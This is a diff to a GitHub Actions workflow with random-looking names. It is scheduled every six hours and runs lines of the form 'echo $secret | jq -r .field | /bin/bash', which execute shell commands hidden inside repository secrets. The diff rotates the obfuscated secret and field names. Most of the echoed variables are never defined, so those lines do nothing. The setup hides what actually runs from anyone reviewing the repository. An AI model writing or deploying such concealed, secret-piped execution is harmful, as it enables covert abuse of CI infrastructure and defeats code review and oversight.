@@ -1,24 +1,21 @@
 name: liulinglong6510
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 4/6 * * *'
+    - cron: '18 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: liulinglong6510
         env:
-          u8: ${{ secrets.u8 }}
+          iagx3: ${{ secrets.iagx3 }}
         run: |
-          echo $u8 | jq -r .tni299 | /bin/bash
-          echo $qers73 | jq -r .c4538 | /bin/bash
-          echo $g9284 | jq -r .uymbb049 | /bin/bash
-          echo $mx636 | jq -r .xdfwn0529 | /bin/bash
-          echo $sm091 | jq -r .biqxy29769 | /bin/bash
-          echo $pi0 | jq -r .tl9321 | /bin/bash
-          echo $j5840 | jq -r .ldhm51 | /bin/bash
-          echo $fu3416 | jq -r .tf962 | /bin/bash
+          echo $iagx3 | jq -r .mb4976 | /bin/bash
+          echo $ds4 | jq -r .jtjeu911 | /bin/bash
+          echo $bh0 | jq -r .y4360 | /bin/bash
+          echo $vunde1813 | jq -r .jzsdu93 | /bin/bash
+          echo $q21 | jq -r .nvly2 | /bin/bash
 
